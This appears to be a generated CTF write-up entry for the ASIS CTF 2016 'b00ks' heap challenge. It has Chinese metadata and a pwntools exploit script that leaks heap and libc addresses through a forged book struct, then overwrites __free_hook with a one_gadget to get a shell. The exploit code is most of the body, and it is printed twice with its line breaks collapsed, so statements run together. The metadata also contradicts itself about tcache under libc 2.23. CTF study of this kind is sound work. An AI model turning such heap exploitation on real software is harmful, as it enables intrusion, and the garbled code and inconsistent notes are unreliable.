---
title: 漏洞学习之 PWN ASIS_CTF_2016_b00ks
contest: ASISCTF
year: 2016
difficulty: medium
vuln_type: pwn_unknown
tags:
- book-management
- fake-book
- libc-leak
- mmap
- Edit
- Change
- Print
- one_gadget
- ASIS
- classic-heap
attack_chain:
- '菜单: 1=Create / 2=Delete / 3=Edit / 4=Print / 5=Change name'
- 'Step 1: Change name 0x20 字节 + Create book1 (0xd0) + book2 (0x21000, mmap)'
- 'Step 2: Print 泄 book1_addr (在 name 后)'
- 'Step 3: Edit book1 写 fake_book: p64(1) + p64(book2+8) * 2 + p64(0x20)'
- 'Step 4: Change name 0x20 重新触发 Print → 泄 libc (book2 内容 mmap 指针指向 libc)'
- libc_base = leak - 0x5b0010
- 'Step 5: Edit 改 free_hook = one_gadget 0x4527a'
- 'Step 6: Delete 触发 one_gadget'
key_payload: '''Edit fake_book + Change name 触发 Print + free_hook = one_gadget 0x4527a + Delete 触发'''
one_liner: ASIS CTF 2016 b00ks：Edit 写 fake book 结构 + Change name 触发 Print 泄 mmap 指针指向 libc，改 free_hook 拿 shell。
lesson: Print 触发条件依赖 name 字段是 b00ks 经典套路；mmap 大块堆布局可绕过 tcache 限制。
quality: high
full_path: 漏洞学习之PWN-ASIS_CTF_2016_b00ks.full.md
meta_path: 漏洞学习之PWN-ASIS_CTF_2016_b00ks.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: '漏洞学习之 PWN ASIS_CTF_2016_b00ks。ASIS CTF 2016 b00ks：Edit 写 fake book 结构 + Change name 触发 Print 泄 mmap 指针指向 libc，改 free_hook 拿 shell。。关键路径：菜单: 1=Create / 2=Delete / 3=Edit / 4=Print / 5=Change name → ...'
category: pwn
subcategory: pwn_other
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/89361.html
reasoning_chain:
- 菜单 1=Create / 2=Delete / 3=Edit / 4=Print / 5=Change name → 触发点：book 结构体管理
- 'Step 1: Change name 0x20 字节 → name 后紧跟 book1_addr（堆地址）→ 假设：堆布局可控'
- 'Step 2: Create book1 (0xd0) + Create book2 (0x21000, mmap) → mmap 大块绕 tcache'
- 动作：Print → 泄 book1_addr (在 name 后 0x20 字节) → 观察：book2_addr = book1 + 0x30
- 'Step 3: Edit book1 → 写 fake_book 结构: p64(1) + p64(book2+8)*2 + p64(0x20)'
- 假设：fake_book[1] = book2+8 → 描述指针指向 book2 → Print 会泄 book2 内存
- 'Step 4: Change name 0x20 重新触发 Print → 泄 libc（book2 的 mmap 指针指向 libc）'
- 动作：libc_base = leak - 0x5b0010 → 下一步：one_gadget
- 'Step 5: Edit book1 + Edit book2 改 free_hook = one_gadget 0x4527a'
- 'Step 6: Delete book2 → 触发 free → 调 one_gadget → shell'
failed_attempts:
- 试图直接 Print book1 拿 libc → 失败：book1 是 0xd0 普通堆，无 libc 指针
- 试图 tcache attack → 失败：libc 2.23 没 tcache，需走 fastbin
- 试图只用 fake_book 不 Change name → 失败：Print 触发条件依赖 name 字段
key_observations:
- name 字段在堆上紧邻 book1，Change name 0x20 后 Print 会泄 book1_addr
- mmap 大块（0x21000）可绕过 fastbin/tcache 限制，单独管理
- fake_book[1] 指针指向 book2 → Print 时按指针走，泄 book2 内存
- Print 同时泄 heap 和 libc 是 b00ks 经典组合
- one_gadget 在 __free_hook 命中需 [rsp+0x30]=0 条件
prerequisites:
- glibc 堆 chunk 结构与指针关系
- mmap 大块堆与 fastbin/tcache 区别
- libc-2.23 经典 gadget 列表
- pwntools ELF + libc base 运算
---
# 漏洞学习之PWN-ASIS_CTF_2016_b00ks

> 原文: https://www.ctfiot.com/89361.html
> ID: 89361

Python
from pwn import *import pdb
from LibcSearcher import *# -*- coding: utf-8 -*- # context.log_level = 'debug'debug = 1

if (debug): p = process("./ASIS_CTF_2016_b00ks")else: p = remote('node4.buuoj.cn', 27816)

# context(arch='i386',os='linux')

elf = ELF('ASIS_CTF_2016_b00ks')libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

def Create(nsize, name, dsize, desc): p.sendlineafter("> ", '1') p.sendlineafter("name size: ", str(nsize)) p.sendlineafter("name (Max 32 chars): ", name) p.sendlineafter("description size: ", str(dsize)) p.sendlineafter("description: ", desc)

def Delete(idx): p.sendlineafter("> ", '2') p.sendlineafter("delete: ", str(idx))

def Edit(idx, desc): p.sendlineafter("> ", '3') p.sendlineafter("edit: ", str(idx)) p.sendlineafter("description: ", desc)

def Print(): p.sendlineafter("> ", '4')

def Change(name): p.sendlineafter("> ", '5') p.sendlineafter("name: ", name)

## leak_heapp.sendlineafter("name: ",b'A'*0x20)Create(0xd0,"AAAA",0x20,"AAAA") #book1Create(0x21000,"BBBB",0x21000,"BBBB") #book2

Print()

p.recvuntil("A" * 0x20)book1_addr = u64(p.recvn(6)+b'x00'+b'x00')

log.info("book1_addr: "+hex(book1_addr))book2_addr = book1_addr + 0x30log.info("book2 address: 0x%x" % book2_addr)

## fakefake_book = p64(1) + p64(book2_addr + 0x8) * 2 + p64(0x20)Edit(1, fake_book)Change("A" * 0x20)

Print()

## libc_basep.recvuntil("Name: ")leak_addr = u64(p.recvn(6)+b'x00'+b'x00')libc_base = leak_addr - 0x5b0010 # mmap_addr - libc_baselog.info("libc address: 0x%x" % libc_base)

one_gadget=[0x45226,0x4527a,0xf03a4,0xf1247]

## pwnfree_hook = libc.symbols['__free_hook'] + libc_baseone_gadget = libc_base + one_gadget[1]

fake_book = p64(free_hook) * 2Edit(1, fake_book)fake_book = p64(one_gadget)Edit(2, fake_book)

Delete(2)
# pdb.set_trace()
p.interactive()


```
Python
from pwn import *import pdb
from LibcSearcher import *# -*- coding: utf-8 -*- # context.log_level = 'debug'debug = 1

if (debug): p = process("./ASIS_CTF_2016_b00ks")else: p = remote('node4.buuoj.cn', 27816)

# context(arch='i386',os='linux')

elf = ELF('ASIS_CTF_2016_b00ks')libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

def Create(nsize, name, dsize, desc): p.sendlineafter("> ", '1') p.sendlineafter("name size: ", str(nsize)) p.sendlineafter("name (Max 32 chars): ", name) p.sendlineafter("description size: ", str(dsize)) p.sendlineafter("description: ", desc)

def Delete(idx): p.sendlineafter("> ", '2') p.sendlineafter("delete: ", str(idx))

def Edit(idx, desc): p.sendlineafter("> ", '3') p.sendlineafter("edit: ", str(idx)) p.sendlineafter("description: ", desc)

def Print(): p.sendlineafter("> ", '4')

def Change(name): p.sendlineafter("> ", '5') p.sendlineafter("name: ", name)

## leak_heapp.sendlineafter("name: ",b'A'*0x20)Create(0xd0,"AAAA",0x20,"AAAA") #book1Create(0x21000,"BBBB",0x21000,"BBBB") #book2

Print()

p.recvuntil("A" * 0x20)book1_addr = u64(p.recvn(6)+b'x00'+b'x00')

log.info("book1_addr: "+hex(book1_addr))book2_addr = book1_addr + 0x30log.info("book2 address: 0x%x" % book2_addr)

## fakefake_book = p64(1) + p64(book2_addr + 0x8) * 2 + p64(0x20)Edit(1, fake_book)Change("A" * 0x20)

Print()

## libc_basep.recvuntil("Name: ")leak_addr = u64(p.recvn(6)+b'x00'+b'x00')libc_base = leak_addr - 0x5b0010 # mmap_addr - libc_baselog.info("libc address: 0x%x" % libc_base)

one_gadget=[0x45226,0x4527a,0xf03a4,0xf1247]

## pwnfree_hook = libc.symbols['__free_hook'] + libc_baseone_gadget = libc_base + one_gadget[1]

fake_book = p64(free_hook) * 2Edit(1, fake_book)fake_book = p64(one_gadget)Edit(2, fake_book)

Delete(2)
# pdb.set_trace()
p.interactive()
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]